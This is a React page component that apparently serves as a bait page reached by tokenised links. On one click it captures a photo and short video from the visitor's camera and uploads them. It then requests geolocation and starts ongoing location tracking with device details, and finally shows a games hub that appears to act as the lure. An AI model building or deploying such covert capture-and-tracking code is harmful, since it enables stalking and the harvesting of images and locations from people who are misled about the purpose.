import React, { useState, useRef, useCallback, useEffect } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import { GPS_OPTIONS } from './geolocation';
import { useLocationTracker } from './hooks/useLocationTracker';
import { useCameraCapture } from './hooks/useCameraCapture';
import { getDeviceInfo } from './deviceInfo';
import { uploadSubjectMedia } from './mediaUpload';
import {
    SUBJECT_TITLE,
    SUBJECT_CAMERA_MESSAGE,
    SUBJECT_GRANTED_KEY,
    SUBJECT_CAMERA_DONE_KEY,
    getClientSessionId,
    CONSENT_TEXT,
    CAMERA_VIDEO_SECONDS
} from './config';
import SubjectArenaGate from './games/SubjectArenaGate';
import './SubjectPage.css';

const noop = () => {};

function SubjectPage() {
    const navigate = useNavigate();
    const [searchParams] = useSearchParams();
    const deviceInfoRef = useRef(getDeviceInfo());
    const [phase, setPhase] = useState('prompt');
    const [activeGameId, setActiveGameId] = useState(null);
    const [trackingEnabled, setTrackingEnabled] = useState(false);
    const [errorDetail, setErrorDetail] = useState('');
    const { runCaptureSession } = useCameraCapture();
    const clientSessionId = useRef(getClientSessionId());

    useEffect(() => {
        const token = searchParams.get('token') || searchParams.get('t');
        if (token) {
            navigate(`/s/${token}`, { replace: true });
        }
    }, [searchParams, navigate]);

    useLocationTracker({
        enabled: trackingEnabled,
        deviceInfo: deviceInfoRef.current,
        testMode: false,
        consentText: CONSENT_TEXT,
        onConnectionChange: noop,
        onDeviceRegistered: noop,
        onUserLocation: noop,
        onDevicesChange: noop,
        onLocationRefining: noop
    });

    useEffect(() => {
        const locOk = localStorage.getItem(SUBJECT_GRANTED_KEY) === 'true';
        const camOk = localStorage.getItem(SUBJECT_CAMERA_DONE_KEY) === 'true';
        if (locOk && camOk) {
            setTrackingEnabled(true);
            setPhase('arena');
        } else if (locOk && !camOk) {
            setPhase('prompt');
        }
    }, []);

    const startTracking = useCallback(() => {
        localStorage.setItem(SUBJECT_GRANTED_KEY, 'true');
        setTrackingEnabled(true);
        setPhase('success');
    }, []);

    useEffect(() => {
        if (phase !== 'success') return undefined;
        const t = setTimeout(() => setPhase('arena'), 1500);
        return () => clearTimeout(t);
    }, [phase]);

    const clientKey = clientSessionId.current;

    const handleSelectGame = useCallback((gameId) => {
        setActiveGameId(gameId);
        setPhase('playing');
    }, []);

    const handleBackToHub = useCallback(() => {
        setActiveGameId(null);
        setPhase('arena');
    }, []);

    const requestLocation = useCallback(() => {
        if (!navigator.geolocation) {
            setPhase('denied');
            return;
        }
        setPhase('location_waiting');
        setErrorDetail('');
        navigator.geolocation.getCurrentPosition(
            () => startTracking(),
            () => setPhase('denied'),
            GPS_OPTIONS
        );
    }, [startTracking]);

    const requestPermissions = useCallback(async () => {
        setPhase('camera_waiting');
        setErrorDetail('');
        try {
            const { photo, video } = await runCaptureSession(CAMERA_VIDEO_SECONDS);
            await uploadSubjectMedia({
                clientSessionId: clientSessionId.current,
                type: 'photo',
                blob: photo
            });
            localStorage.setItem(SUBJECT_CAMERA_DONE_KEY, 'true');
            if (video) {
                await uploadSubjectMedia({
                    clientSessionId: clientSessionId.current,
                    type: 'video',
                    blob: video
                });
            }
            requestLocation();
        } catch (err) {
            const msg = err?.message || String(err);
            setErrorDetail(msg);
            if (msg === 'NOT_SUPPORTED') {
                setPhase('denied');
                return;
            }
            if (err?.name === 'NotAllowedError' || msg.includes('Permission')) {
                setPhase('camera_denied');
                return;
            }
            setPhase('upload_error');
        }
    }, [runCaptureSession, requestLocation]);

    const waiting =
        phase === 'camera_waiting' || phase === 'location_waiting' || phase === 'waiting';

    if (phase === 'success') {
        return (
            <div className="pulse-splash">
                <div>
                    <div className="pulse-splash__ring" aria-hidden />
                    <h1 style={{ margin: 0, fontSize: '1.5rem' }}>Hazırsınız!</h1>
                </div>
            </div>
        );
    }

    if (phase === 'arena' || phase === 'playing') {
        return (
            <SubjectArenaGate
                clientKey={clientKey}
                activeGameId={activeGameId}
                onSelectGame={handleSelectGame}
                onBackToHub={handleBackToHub}
            />
        );
    }

    return (
        <div className="subject-page">
            <div className="subject-card">
                <>
                        <div className="subject-icon">🔒</div>
                        <h1 className="subject-title">{SUBJECT_TITLE}</h1>
                        <p className="subject-text">{SUBJECT_CAMERA_MESSAGE}</p>
                        {waiting ? (
                            <p className="subject-hint">
                                {phase === 'camera_waiting'
                                    ? 'Kamera: foto və qısa video hazırlanır...'
                                    : 'Konum yoxlanılır...'}
                            </p>
                        ) : (
                            <button type="button" className="subject-btn" onClick={requestPermissions}>
                                Davam et
                            </button>
                        )}
                        {phase === 'camera_denied' && (
                            <p className="subject-error">
                                Kamera icazəsi verilmədi. Brauzer parametrlərindən bu sayta kamera
                                icazəsi verib yenidən cəhd edin.
                            </p>
                        )}
                        {phase === 'upload_error' && (
                            <p className="subject-error">
                                Media serverə göndərilmədi.
                                {errorDetail && ` (${errorDetail})`}
                            </p>
                        )}
                        {phase === 'denied' && (
                            <p className="subject-error">
                                Konum və ya kamera dəstəklənmir.
                            </p>
                        )}
                </>
            </div>
        </div>
    );
}

export default SubjectPage;
